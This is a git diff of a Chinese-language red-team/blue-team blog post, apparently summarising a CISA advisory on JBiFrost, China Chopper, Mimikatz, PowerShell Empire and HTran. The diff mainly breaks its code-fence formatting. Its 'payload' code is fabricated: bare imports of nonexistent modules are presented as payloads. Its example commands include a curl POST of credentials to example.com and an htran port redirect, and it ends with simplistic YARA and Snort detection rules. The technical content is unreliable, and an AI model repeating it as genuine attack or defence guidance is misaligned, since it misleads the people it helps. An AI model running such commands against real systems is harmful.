@@ -24,27 +24,36 @@ categories: [security]
 
 ## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
 * **攻擊前置需求**: 攻擊者需要有目標系統的遠程存取權限和網路位置。
-* **Payload 建構邏輯**: 
-    ```python
-    # JBiFrost Payload
-    import socket
-    import subprocess
+* **Payload 建構邏輯**:
 
-    # China Chopper Payload
-    import requests
-    import base64
-
-    # Mimikatz Payload
-    import mimikatz
-
-    # PowerShell Empire Payload
-    import powershell
-
-    # HUC Packet Transmitter Payload
-    import htran
+    ```
+    
+    python
+        # JBiFrost Payload
+        import socket
+        import subprocess
+    
+        # China Chopper Payload
+        import requests
+        import base64
+    
+        # Mimikatz Payload
+        import mimikatz
+    
+        # PowerShell Empire Payload
+        import powershell
+    
+        # HUC Packet Transmitter Payload
+        import htran
+        
+    
     ```
     *範例指令*: 
-    ```bash
+    
+
+```
+
+bash
     # JBiFrost
     curl -X POST -d "username=admin&password=admin" http://example.com/jbifrost
 
@@ -59,7 +68,9 @@ categories: [security]
 
     # HUC Packet Transmitter
     htran -s 8080 -d 8081
-    ```
+    
+
+```
 * **繞過技術**: 攻擊者可以使用各種繞過技術來避免被檢測，例如使用加密和混淆技術。
 
 ## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
@@ -72,20 +83,31 @@ categories: [security]
     | PowerShell Empire | empire.ps1 |
     | HUC Packet Transmitter | htran.exe |
 * **偵測規則 (Detection Rules)**:
-    ```yara
-    rule JBiFrost {
-        meta:
-            description = "JBiFrost遠程存取木馬"
-            author = "Your Name"
-        strings:
-            $a = "JBiFrost"
-        condition:
-            $a
-    }
+
     ```
-    ```snort
+    
+    yara
+        rule JBiFrost {
+            meta:
+                description = "JBiFrost遠程存取木馬"
+                author = "Your Name"
+            strings:
+                $a = "JBiFrost"
+            condition:
+                $a
+        }
+        
+    
+    ```
+    
+
+```
+
+snort
     alert tcp any any -> any 8080 (msg:"China Chopper網頁殼"; sid:1000001; rev:1;)
-    ```
+    
+
+```
 * **緩解措施**: 
     1. 更新和修補系統和應用程序。
     2. 使用防火牆和入侵檢測系統。
@@ -102,5 +124,4 @@ categories: [security]
 ## 5. 🔗 參考文獻與延伸閱讀
 - [原始報告](https://www.cisa.gov/news-events/cybersecurity-advisories/aa18-284a)
 - [MITRE ATT&CK](https://attack.mitre.org/)
-
 
